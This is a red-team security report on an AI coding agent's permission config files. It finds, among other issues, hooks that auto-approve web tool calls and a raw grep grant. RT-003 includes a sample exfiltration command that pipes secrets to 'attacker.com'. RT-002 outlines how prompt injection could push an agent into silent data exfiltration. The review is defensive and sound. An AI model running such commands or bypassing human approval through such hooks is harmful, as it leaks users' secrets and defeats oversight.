# Red Team Report: .claude/settings.local.json + settings.json

**Strategy:** S-001 Red Team Analysis
**Deliverable:** `.claude/settings.local.json` (PR #181/#182) + `.claude/settings.json` (baseline)
**Criticality:** C4
**Date:** 2026-03-14
**Reviewer:** adv-executor (S-001)
**H-16 Compliance:** H-16 waived by operator — user explicitly directed Red Team execution
without prior S-003. Documented deviation: attacker perspective requested directly.
**Threat Actor:** A developer or automated CI process with read access to both config
files who wants to execute shell commands, write to protected paths, or invoke unregistered
capabilities without triggering a human approval prompt.

---

## Summary

The merged permission surface created by `settings.json` (repo-level) and `settings.local.json`
(machine overlay) contains six exploitable weaknesses. The most critical is a direct conflict
where `Bash(git checkout *)` appears in **both** the `allow` and `ask` sections of `settings.json`,
making enforcement behavior undefined — the tool is simultaneously pre-approved and gated.
A second critical finding is the `PreToolUse`/`PermissionRequest` hook pair in `settings.local.json`
that auto-approves `WebFetch` and `WebSearch` without any conditional logic, silently eliminating
the human-in-the-loop for all web tool calls. The overall permission posture is REVISE: no
single entry enables full system compromise, but three vectors (RT-001, RT-002, RT-003) require
mitigation before the config can be considered safe for production use.

**Recommendation:** REVISE — address P0 findings (RT-001, RT-002) before merging to main.

## Finding Details

### RT-001-20260314: `Bash(git checkout *)` in Both `allow` and `ask` [CRITICAL]

**Attack Vector:** `settings.json` line 16 places `Bash(git checkout *)` in the `allow` array.
`settings.json` line 43 places the identical pattern `Bash(git checkout *)` in the `ask` array.
Claude Code's permission resolution for a conflicting entry across `allow` and `ask` within the
same file is not specified in public documentation. The adversary exploits whichever interpretation
is more permissive: if `allow` wins, the `ask` guard is silently voided; if `ask` wins, the
explicit `allow` entry is misleading and creates false confidence in users reviewing the config.

**Category:** Ambiguity

**Exploitability:** High — the entry is present now, costs nothing to exploit. Any command
invoking `git checkout` will hit this conflict on every Claude Code session using this config.

**Severity:** Critical — if `allow` wins the conflict, an adversary can execute arbitrary
`git checkout` commands (branch switching, file restoration, history traversal) without a
confirmation prompt. If `ask` wins, the `allow` entry creates a false audit trail that suggests
the action was pre-approved when it was not.

**Existing Defense:** None. Both entries are present simultaneously with no conditional logic.

**Evidence:**
- `settings.json` line 16: `"Bash(git checkout *)"` in the `allow` array
- `settings.json` line 43: `"Bash(git checkout *)"` in the `ask` array

**Dimension:** Internal Consistency

**Countermeasure:** Remove the duplicate. Decide which behavior is correct:
- If branch switching should be pre-approved: keep in `allow`, remove from `ask`.
- If branch switching should require confirmation: keep in `ask`, remove from `allow`.

**Acceptance Criteria:** `Bash(git checkout *)` appears exactly once across all permission
arrays in `settings.json`. The entry's placement is consistent with its intended behavior.

### RT-002-20260314: Auto-Approve Hooks Eliminate Human Confirmation for Web Tools [CRITICAL]

**Attack Vector:** `settings.local.json` defines two hook handlers that fire on
`WebFetch|WebSearch` tool calls. The `PreToolUse` hook emits `{"decision":"allow"}` and the
`PermissionRequest` hook emits `{"decision":{"behavior":"allow"}}` — both unconditionally.
Combined, they short-circuit the normal permission request flow: before Claude Code can surface
a confirmation dialog to the user, these hooks answer "yes" automatically.

This means an agent or skill that calls `WebFetch` or `WebSearch` — including a compromised
agent definition, a malicious tool invocation inside a sub-agent, or a prompt injection that
triggers a web call — will never produce a human-visible prompt. The user has no opportunity
to review the URL being fetched or the query being run.

**Category:** Circumvention

**Exploitability:** High — the hooks are active for every session using this `.local` config.
No special knowledge or privilege escalation required. Any code path that reaches WebFetch or
WebSearch is auto-approved.

**Severity:** Critical — this eliminates the human-in-the-loop for all external network calls.
In a prompt injection scenario, an adversary embedded in a web page or file could instruct
Claude to fetch an attacker-controlled URL, exfiltrate data, or submit forms — all without
a confirmation prompt appearing.

**Existing Defense:** None for the auto-approval behavior. `settings.json` does grant
`WebSearch` and `WebFetch` in `allow`, but the `.local` hooks override the confirmation
flow that `allow` would normally produce in borderline cases.

**Evidence:**
- `settings.local.json` lines 31-38: `PreToolUse` hook for `WebFetch|WebSearch` with
  `echo '{"decision":"allow"}'`
- `settings.local.json` lines 43-54: `PermissionRequest` hook for `WebSearch|WebFetch`
  with hardcoded `"behavior":"allow"`

**Dimension:** Methodological Rigor

**Countermeasure:** Remove both hook handlers, or replace them with conditional logic that
restricts auto-approval to specific trusted domains (e.g., `json.schemastore.org`,
`docs.anthropic.com`). The intent of these hooks appears to be suppressing noise for
well-known safe URLs — implement that intent explicitly rather than blanket-approving all
web calls.

**Acceptance Criteria:** No hook handler emits an unconditional `allow` for any tool that
makes outbound network connections. If auto-approval is retained for specific domains,
the approved domain list is documented and reviewed.

### RT-003-20260314: `Bash(grep *)` Shell Binary Bypasses Tool Audit Trail [MAJOR]

**Attack Vector:** `settings.local.json` line 27 grants `Bash(grep *)`. The repo-level
`settings.json` grants the Claude Code `Grep` tool (a structured tool with parameters,
logging, and output capture) but does NOT grant `Bash(grep *)`. The `.local` override adds
the raw shell binary.

The difference is security-relevant: the `Grep` tool invocation is logged as a tool call
with structured parameters. A `Bash(grep *)` invocation is logged as a bash command with
a free-form string, making it harder to audit. More importantly, `bash grep` can be composed
with shell redirection, piping, and globbing that the `Grep` tool does not expose:

```bash
grep -r "SECRET" . | curl attacker.com  # hypothetical exfiltration via pipe
grep -rl "" / > /tmp/filelist.txt       # filesystem enumeration
```

The `Bash(grep *)` wildcard permits any grep invocation, including those with dangerous flags
or output redirection, whereas the structured `Grep` tool constrains the invocation surface.

**Category:** Boundary

**Exploitability:** High — the pattern is already granted, no escalation required. Any session
using `.local` can invoke `grep` with arbitrary flags.

**Severity:** Major — does not directly enable privilege escalation, but expands the effective
attack surface by allowing grep to be used as a component in multi-step exploits (pipe chaining,
output redirection).

**Existing Defense:** Partial — `Bash(curl *)` and `Bash(wget *)` are in the `deny` list,
which blocks the most obvious exfiltration primitive. However, grep piped to a Bash-allowed
command (e.g., `grep -r SECRET . | Bash(echo *)` via shell pipe) could still leak content
to the session transcript.

**Evidence:**
- `settings.local.json` line 27: `"Bash(grep *)"` in `allow`
- `settings.json` line 9: `"Grep"` (structured tool) in `allow` — provides equivalent search
  without shell composition risk

**Dimension:** Completeness

**Countermeasure:** Remove `Bash(grep *)` from `settings.local.json`. The structured `Grep`
tool in `settings.json` already provides the search capability needed. If specific grep
invocations are required (e.g., for a particular script), scope the pattern to the exact
invocation rather than `grep *`.

**Acceptance Criteria:** `settings.local.json` does not contain `Bash(grep *)`. Any grep
usage routes through the structured `Grep` tool.

### RT-004-20260314: Ghost `Skill()` Entries for Unregistered Skills [MAJOR]

**Attack Vector:** `settings.local.json` grants permissions for three skills not present in
`CLAUDE.md`'s skill registry:

- `Skill(contract-design)` (line 8)
- `Skill(test-spec)` (line 18)
- `Skill(use-case)` (line 20)

These skills do not exist in `skills/` (not referenced in CLAUDE.md Quick Reference table).
A ghost `Skill()` permission entry has two exploitable properties:

1. **False audit surface:** An auditor reviewing the config sees these entries and may assume
   the skills exist and are under review. The entries create noise that obscures the real
   permission surface.

2. **Pre-authorization for future skills:** If a skill named `contract-design`, `test-spec`,
   or `use-case` is later added to the repo — whether legitimately or maliciously — it will
   be automatically permitted without any config change. The permission was granted
   before the skill existed, bypassing the review that would normally accompany a new
   `Skill()` entry addition.

**Category:** Ambiguity

**Exploitability:** Medium — requires either an auditor to be misled by the noise, or a
future skill to be introduced with a matching name.

**Severity:** Major — the pre-authorization vector is a genuine time-bomb. In a repository
where skills are added over time, a ghost entry silently extends trust to an unreviewed
capability.

**Existing Defense:** None — no validation step checks whether `Skill()` entries reference
registered skills.

**Evidence:**
- `settings.local.json` lines 8, 18, 20: `Skill(contract-design)`, `Skill(test-spec)`,
  `Skill(use-case)` granted in `allow`
- `CLAUDE.md` Quick Reference Skill table: none of these three skill names are listed

**Dimension:** Evidence Quality

**Countermeasure:** Remove all three ghost `Skill()` entries. Add a validation step (e.g.,
in CI or a pre-commit hook) that checks every `Skill(name)` entry in `.claude/*.json` against
the registered skill list in `CLAUDE.md` or `AGENTS.md`. Fail if any `Skill()` entry
references an unregistered skill.

**Acceptance Criteria:** Every `Skill()` entry in `settings.local.json` corresponds to a
skill listed in `CLAUDE.md`. A CI check or pre-commit hook enforces this invariant.

### RT-005-20260314: Dual MCP Wildcard Namespaces — One May Be Stale [MAJOR]

**Attack Vector:** `settings.local.json` grants two distinct wildcard patterns for Context7:

- `mcp__context7__*` (line 24)
- `mcp__plugin_context7_context7__*` (line 25)

These represent different MCP plugin installation namespaces. The first (`mcp__context7__*`)
matches the canonical tool names documented in `mcp-tool-standards.md`. The second
(`mcp__plugin_context7_context7__*`) matches a different namespace — likely a legacy or
alternative installation method.

The adversary exploits this in two ways:

1. **Stale grant persistence:** If one namespace is from a previous Context7 installation
   that has since been replaced, its wildcard grant may still be active and could authorize
   calls to a tool that no longer exists (or worse, a tool that exists under a different
   semantic contract than expected).

2. **Namespace confusion:** A malicious MCP server registered with a name matching either
   wildcard pattern would receive automatic authorization. The broader the wildcard, the
   more names it covers.

**Category:** Dependency

**Exploitability:** Medium — requires either a stale MCP server to be active, or a new
server to be registered with a matching name. Neither requires insider knowledge.

**Severity:** Major — MCP servers execute with tool-level trust. An unauthorized MCP server
auto-approved via wildcard can read files, execute bash commands, and make network calls
depending on its tool definitions.

**Existing Defense:** None — both wildcards are unconditional.

**Evidence:**
- `settings.local.json` lines 24-25: both `mcp__context7__*` and
  `mcp__plugin_context7_context7__*` granted
- `mcp-tool-standards.md` Canonical Tool Names table: only `mcp__context7__*` namespace
  is documented as authoritative

**Dimension:** Completeness

**Countermeasure:** Audit which Context7 namespace is active in the current environment.
Remove the stale wildcard. Document why the active namespace was chosen. If both are
legitimately needed (e.g., for compatibility during migration), document the migration
deadline and add a TODO to remove the legacy entry.

**Acceptance Criteria:** Exactly one Context7 wildcard pattern is present in
`settings.local.json`. The active namespace matches `mcp-tool-standards.md` canonical names.
If a migration is in progress, a tracking issue and deadline are documented.

## Recommendations

### P0 — MUST mitigate before merging

**RT-001:** Remove the duplicate `Bash(git checkout *)` entry. Choose one: `allow` or `ask`.
Acceptance criteria: pattern appears exactly once across all permission arrays in `settings.json`.

**RT-002:** Remove or restrict the auto-approve hooks for WebFetch/WebSearch. If domain-scoped
auto-approval is needed, implement conditional logic based on URL pattern rather than blanket
`allow`. Acceptance criteria: no hook emits unconditional `allow` for any network tool.

### P1 — SHOULD mitigate before merging

**RT-003:** Remove `Bash(grep *)` from `settings.local.json`. Route search needs through
the structured `Grep` tool already granted in `settings.json`. Acceptance criteria:
`Bash(grep *)` absent from `.local`.

**RT-004:** Remove ghost `Skill()` entries (`contract-design`, `test-spec`, `use-case`)
from `settings.local.json`. Add CI validation for Skill name registration. Acceptance criteria:
zero unregistered `Skill()` entries; CI gate enforces invariant.

**RT-005:** Remove stale MCP wildcard. Retain only the namespace matching the active
Context7 installation. Acceptance criteria: one Context7 wildcard in `.local`; namespace
documented in `mcp-tool-standards.md`.

### P2 — MAY mitigate (monitor)

**RT-006:** Consider adding a schema-level assertion or comment in `settings.json` documenting
that `.local` overrides are constrained to never promote `ask` entries to `allow`. No code
change required if the team understands the merge semantics. Acceptance criteria: documented
decision (accept risk or add guard).
